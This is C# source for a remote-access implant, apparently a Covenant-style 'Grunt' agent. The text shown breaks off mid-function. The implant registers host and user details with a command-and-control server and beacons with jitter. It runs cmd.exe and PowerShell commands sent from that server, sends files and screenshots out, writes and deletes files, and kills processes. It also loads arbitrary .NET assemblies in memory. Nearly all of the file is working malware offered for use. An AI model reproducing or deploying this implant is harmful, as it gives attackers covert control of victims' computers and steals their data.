using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace BruteExecutor
{
    internal static class Native
    {
        // Constants
        public const uint TH32CS_SNAPPROCESS = 0x00000002;
        public const int MAX_PATH = 260;
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;
        public const uint CREATE_ALWAYS = 2;
        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        public const uint INVALID_FILE_SIZE = 0xFFFFFFFF;
        public const int INVALID_HANDLE_VALUE = -1;
        public const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
        public const uint INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF;
        public const uint PROCESS_TERMINATE = 0x0001;
        public const uint TOKEN_QUERY = 0x0008;
        public const int TokenUser = 1;
        public const uint SRCCOPY = 0x00CC0020;
        public const uint BI_RGB = 0;
        public const uint DIB_RGB_COLORS = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct PROCESSENTRY32W
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            public string szExeFile;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WIN32_FIND_DATAW
        {
            public uint dwFileAttributes;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int Left, Top, Right, Bottom; }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public uint[] bmiColors;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetCurrentDirectoryW(uint nBufferLength, StringBuilder lpBuffer);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool SetCurrentDirectoryW(string lpPathName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetComputerNameW(StringBuilder lpBuffer, ref uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr FindFirstFileW(string lpFileName, out WIN32_FIND_DATAW lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool FindNextFileW(IntPtr hFindFile, out WIN32_FIND_DATAW lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FindClose(IntPtr hFindFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateDirectoryW(string lpPathName, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool DeleteFileW(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool RemoveDirectoryW(string lpPathName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CopyFileW(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFileAttributesW(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool GetUserNameW(StringBuilder lpBuffer, ref uint nSize);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LookupAccountSidW(string lpSystemName, IntPtr Sid, StringBuilder Name, ref uint cchName, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out uint peUse);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, [Out] byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME ft)
        {
            long high = (long)ft.dwHighDateTime << 32;
            return DateTime.FromFileTime(high | (uint)ft.dwLowDateTime);
        }
    }

    class Brute
    {
        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
        {
            try
            {
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                string Hostname = Dns.GetHostName();
                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                IMessenger baseMessenger = null;
                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                baseMessenger.Read();
                baseMessenger.Identifier = GUID;
                TaskingMessenger messenger = new TaskingMessenger
                (
                    new MessageCrafter(GUID, SessionKey),
                    baseMessenger,
                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                );
                messenger.QueueTaskingMessage(RegisterBody);
                messenger.WriteTaskingMessage();
                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    messenger.QueueTaskingMessage("");
                    messenger.WriteTaskingMessage();
                }
                catch (Exception) { }

                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
                    if (rnd.Next(2) == 0) { change = -change; }
                    Thread.Sleep((Delay + change) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            string output = "";
                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                            {
                                if (int.TryParse(message.Message, out int val))
                                {
                                    if (message.Type == GruntTaskingType.SetDelay)
                                    {
                                        Delay = val;
                                        output += "Set Delay: " + Delay;
                                    }
                                    else if (message.Type == GruntTaskingType.SetJitter)
                                    {
                                        Jitter = val;
                                        output += "Set Jitter: " + Jitter;
                                    }
                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                    {
                                        ConnectAttempts = val;
                                        output += "Set ConnectAttempts: " + ConnectAttempts;
                                    }
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.SetKillDate)
                            {
                                if (DateTime.TryParse(message.Message, out DateTime date))
                                {
                                    KillDate = date;
                                    output += "Set KillDate: " + KillDate.ToString();
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.Exit)
                            {
                                output += "Exited";
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                                messenger.WriteTaskingMessage();
                                return;
                            }
                            else if(message.Type == GruntTaskingType.Tasks)
                            {
                                if (!Tasks.Where(T => T.Value.ThreadState == ThreadState.Running).Any()) { output += "No active tasks!"; }
                                else
                                {
                                    output += "Task       Status" + Environment.NewLine;
                                    output += "----       ------" + Environment.NewLine;
                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.ThreadState == ThreadState.Running).Select(T => T.Key + " Active").ToArray());
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if(message.Type == GruntTaskingType.TaskKill)
                            {
                                var matched = Tasks.Where(T => T.Value.ThreadState == ThreadState.Running && T.Key.ToLower() == message.Message.ToLower());
                                if (!matched.Any())
                                {
                                    output += "No active task with name: " + message.Message;
                                }
                                else
                                {
                                    KeyValuePair<string, Thread> t = matched.First();
                                    t.Value.Abort();
                                    Thread.Sleep(3000);
                                    if (t.Value.IsAlive)
                                    {
                                        t.Value.Suspend();
                                    }
                                    output += "Task: " + t.Key + " killed!";
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Token)
                            {
                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                bool completed = t.Join(5000);
                            }
                            else
                            {
                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                            }
                        }
                        messenger.WriteTaskingMessage();
                    }
                    catch (ObjectDisposedException)
                    {
                        ConnectAttemptCount++;
                        messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "").ToJson());
                        messenger.WriteTaskingMessage();
                    }
                    catch (Exception e)
                    {
                        ConnectAttemptCount++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static void TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
        {
            const int MAX_MESSAGE_SIZE = 1048576;
            string output = "";
            try
            {
                if (message.Type == GruntTaskingType.Connect)
                {
                    string[] split = message.Message.Split(',');
                    bool connected = messenger.Connect(split[0], split[1]);
                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
                }
                else if (message.Type == GruntTaskingType.Disconnect)
                {
                    bool disconnected = messenger.Disconnect(message.Message);
                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
                else if (message.Type == GruntTaskingType.Shell)
                {
                    try {
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c " + message.Message;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();
                        output += p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit();
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.ShellCmd)
                {
                    try {
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c " + message.Message;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();
                        output += p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit();
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.PowerShell)
                {
                    try {
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo.FileName = "powershell.exe";
                        p.StartInfo.Arguments = "-nop -c " + message.Message;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();
                        output += p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit();
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.WhoAmI)
                {
                    try {
                        StringBuilder userName = new StringBuilder(256);
                        uint size = 256;
                        Native.GetUserNameW(userName, ref size);
                        IntPtr hToken;
                        if (Native.OpenProcessToken(Native.GetCurrentProcess(), Native.TOKEN_QUERY, out hToken))
                        {
                            uint tokenInfoLength = 0;
                            Native.GetTokenInformation(hToken, Native.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);
                            IntPtr tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);
                            if (Native.GetTokenInformation(hToken, Native.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
                            {
                                IntPtr pSid = Marshal.ReadIntPtr(tokenInfo);
                                StringBuilder name = new StringBuilder(256);
                                StringBuilder domain = new StringBuilder(256);
                                uint nameSize = 256, domainSize = 256, peUse;
                                Native.LookupAccountSidW(null, pSid, name, ref nameSize, domain, ref domainSize, out peUse);
                                output += domain.ToString() + "\\" + name.ToString();
                            }
                            Marshal.FreeHGlobal(tokenInfo);
                            Native.CloseHandle(hToken);
                        }
                        else { output += userName.ToString(); }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.Pwd)
                {
                    StringBuilder sb = new StringBuilder(260);
                    Native.GetCurrentDirectoryW(260, sb);
                    output += sb.ToString();
                }
                else if (message.Type == GruntTaskingType.Cd)
                {
                    if (Native.SetCurrentDirectoryW(message.Message)) {
                        StringBuilder sb = new StringBuilder(260);
                        Native.GetCurrentDirectoryW(260, sb);
                        output += sb.ToString();
                    } else { output += "Failed to change directory"; }
                }
                else if (message.Type == GruntTaskingType.ListDirectory)
                {
                    try {
                        string path = string.IsNullOrEmpty(message.Message) ? "." : message.Message;
                        string searchPath = path.EndsWith("\\") ? path + "*" : path + "\\*";
                        Native.WIN32_FIND_DATAW findData;
                        IntPtr hFind = Native.FindFirstFileW(searchPath, out findData);
                        if (hFind.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            output += string.Format("{0,-12} {1,-20} {2}\n", "Type", "Modified", "Name");
                            do {
                                string type = (findData.dwFileAttributes & Native.FILE_ATTRIBUTE_DIRECTORY) != 0 ? "<DIR>" : "<FILE>";
                                DateTime modified = Native.FileTimeToDateTime(findData.ftLastWriteTime);
                                output += string.Format("{0,-12} {1,-20} {2}\n", type, modified.ToString("yyyy-MM-dd HH:mm:ss"), findData.cFileName);
                            } while (Native.FindNextFileW(hFind, out findData));
                            Native.FindClose(hFind);
                        } else { output += "Directory not found or empty"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.ReadFile)
                {
                    try {
                        IntPtr hFile = Native.CreateFileW(message.Message, Native.GENERIC_READ, Native.FILE_SHARE_READ, IntPtr.Zero, Native.OPEN_EXISTING, Native.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
                            byte[] buffer = new byte[fileSize];
                            uint bytesRead;
                            Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero);
                            Native.CloseHandle(hFile);
                            output += Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                        } else { output += "Failed to open file"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.WriteFile)
                {
                    try {
                        string[] parts = message.Message.Split(new char[] { ',' }, 2);
                        byte[] content = Encoding.UTF8.GetBytes(parts[1]);
                        IntPtr hFile = Native.CreateFileW(parts[0], Native.GENERIC_WRITE, 0, IntPtr.Zero, Native.CREATE_ALWAYS, Native.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            uint written;
                            Native.WriteFile(hFile, content, (uint)content.Length, out written, IntPtr.Zero);
                            Native.CloseHandle(hFile);
                            output += "Wrote " + written + " bytes to " + parts[0];
                        } else { output += "Failed to create file"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.GetHostname)
                {
                    StringBuilder sb = new StringBuilder(256);
                    uint size = 256;
                    Native.GetComputerNameW(sb, ref size);
                    output += sb.ToString();
                }
                else if (message.Type == GruntTaskingType.ProcessList)
                {
                    try {
                        IntPtr hSnap = Native.CreateToolhelp32Snapshot(Native.TH32CS_SNAPPROCESS, 0);
                        if (hSnap.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            Native.PROCESSENTRY32W pe = new Native.PROCESSENTRY32W();
                            pe.dwSize = (uint)Marshal.SizeOf(pe);
                            output += string.Format("{0,-8} {1,-8} {2}\n", "PID", "PPID", "Name");
                            if (Native.Process32FirstW(hSnap, ref pe)) {
                                do { output += string.Format("{0,-8} {1,-8} {2}\n", pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile); }
                                while (Native.Process32NextW(hSnap, ref pe));
                            }
                            Native.CloseHandle(hSnap);
                        }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.Kill)
                {
                    try {
                        uint pid = uint.Parse(message.Message);
                        IntPtr hProc = Native.OpenProcess(Native.PROCESS_TERMINATE, false, pid);
                        if (hProc != IntPtr.Zero) {
                            Native.TerminateProcess(hProc, 0);
                            Native.CloseHandle(hProc);
                            output += "Process " + pid + " terminated";
                        } else { output += "Failed to open process"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.CreateDirectory)
                {
                    output += Native.CreateDirectoryW(message.Message, IntPtr.Zero) ? "Created: " + message.Message : "Failed to create directory";
                }
                else if (message.Type == GruntTaskingType.Delete)
                {
                    uint attr = Native.GetFileAttributesW(message.Message);
                    if (attr != Native.INVALID_FILE_ATTRIBUTES) {
                        bool success = (attr & Native.FILE_ATTRIBUTE_DIRECTORY) != 0 ? Native.RemoveDirectoryW(message.Message) : Native.DeleteFileW(message.Message);
                        output += success ? "Deleted: " + message.Message : "Failed to delete";
                    } else { output += "Path not found"; }
                }
                else if (message.Type == GruntTaskingType.Copy)
                {
                    string[] parts = message.Message.Split(new char[] { '|' }, 2);
                    output += Native.CopyFileW(parts[0], parts[1], false) ? "Copied to " + parts[1] : "Failed to copy";
                }
                else if (message.Type == GruntTaskingType.Download)
                {
                    try {
                        IntPtr hFile = Native.CreateFileW(message.Message, Native.GENERIC_READ, Native.FILE_SHARE_READ, IntPtr.Zero, Native.OPEN_EXISTING, Native.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
                            byte[] buffer = new byte[fileSize];
                            uint bytesRead;
                            Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero);
                            Native.CloseHandle(hFile);
                            output += Convert.ToBase64String(buffer, 0, (int)bytesRead);
                        } else { output += "Failed to open file"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.Upload)
                {
                    try {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        byte[] content = Convert.FromBase64String(parts[1]);
                        IntPtr hFile = Native.CreateFileW(parts[0], Native.GENERIC_WRITE, 0, IntPtr.Zero, Native.CREATE_ALWAYS, Native.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE) {
                            uint written;
                            Native.WriteFile(hFile, content, (uint)content.Length, out written, IntPtr.Zero);
                            Native.CloseHandle(hFile);
                            output += "Uploaded " + written + " bytes to " + parts[0];
                        } else { output += "Failed to create file"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.Screenshot)
                {
                    try {
                        IntPtr hDesktop = Native.GetDesktopWindow();
                        IntPtr hDC = Native.GetDC(hDesktop);
                        Native.RECT rect;
                        Native.GetWindowRect(hDesktop, out rect);
                        int width = rect.Right - rect.Left;
                        int height = rect.Bottom - rect.Top;
                        IntPtr hMemDC = Native.CreateCompatibleDC(hDC);
                        IntPtr hBitmap = Native.CreateCompatibleBitmap(hDC, width, height);
                        IntPtr hOld = Native.SelectObject(hMemDC, hBitmap);
                        Native.BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, Native.SRCCOPY);
                        Native.SelectObject(hMemDC, hOld);
                        Native.BITMAPINFO bmi = new Native.BITMAPINFO();
                        bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Native.BITMAPINFOHEADER));
                        bmi.bmiHeader.biWidth = width;
                        bmi.bmiHeader.biHeight = -height;
                        bmi.bmiHeader.biPlanes = 1;
                        bmi.bmiHeader.biBitCount = 24;
                        bmi.bmiHeader.biCompression = Native.BI_RGB;
                        bmi.bmiColors = new uint[256];
                        int stride = ((width * 3 + 3) / 4) * 4;
                        byte[] pixels = new byte[stride * height];
                        Native.GetDIBits(hMemDC, hBitmap, 0, (uint)height, pixels, ref bmi, Native.DIB_RGB_COLORS);
                        using (MemoryStream ms = new MemoryStream()) {
                            ms.Write(new byte[] { 0x42, 0x4D }, 0, 2);
                            int fileSize = 54 + pixels.Length;
                            ms.Write(BitConverter.GetBytes(fileSize), 0, 4);
                            ms.Write(new byte[] { 0, 0, 0, 0 }, 0, 4);
                            ms.Write(BitConverter.GetBytes(54), 0, 4);
                            ms.Write(BitConverter.GetBytes(40), 0, 4);
                            ms.Write(BitConverter.GetBytes(width), 0, 4);
                            ms.Write(BitConverter.GetBytes(height), 0, 4);
                            ms.Write(BitConverter.GetBytes((ushort)1), 0, 2);
                            ms.Write(BitConverter.GetBytes((ushort)24), 0, 2);
                            ms.Write(BitConverter.GetBytes(0), 0, 4);
                            ms.Write(BitConverter.GetBytes(pixels.Length), 0, 4);
                            ms.Write(new byte[16], 0, 16);
                            for (int y = height - 1; y >= 0; y--) ms.Write(pixels, y * stride, stride);
                            output += Convert.ToBase64String(ms.ToArray());
                        }
                        Native.DeleteObject(hBitmap);
                        Native.DeleteDC(hMemDC);
                        Native.ReleaseDC(hDesktop, hDC);
                    } catch (Exception ex) { output += "Error: " + ex.Message; }
                }
                else if (message.Type == GruntTaskingType.ExecuteAssembly)
                {
                    try {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        byte[] asmBytes = Convert.FromBase64String(parts[0]);
                        string[] args = parts.Length > 1 && !string.IsNullOrEmpty(parts[1]) ? SplitArgs(parts[1]) : new string[0];
                        Assembly asm = Assembly.Load(asmBytes);
                        MethodInfo entryPoint = asm.EntryPoint;
                        if (entryPoint != null) {
                            TextWriter realOut = Console.Out, realErr = Console.Error;
                            StringWriter sw = new StringWriter();
                            Console.SetOut(sw); Console.SetError(sw);
                            try {
                                object[] invokeParams = entryPoint.GetParameters().Length > 0 ? new object[] { args } : null;
                                entryPoint.Invoke(null, invokeParams);
                            } finally { Console.Out.Flush(); Console.Error.Flush(); Console.SetOut(realOut); Console.SetError(realErr); }
                            output += sw.ToString();
                        } else { output += "No entry point found"; }
                    } catch (Exception ex) { output += "Error: " + ex.Message + (ex.InnerException != null ? "\nInner: " + ex.InnerException.Message : ""); }
                }
            }
            catch (Exception e)
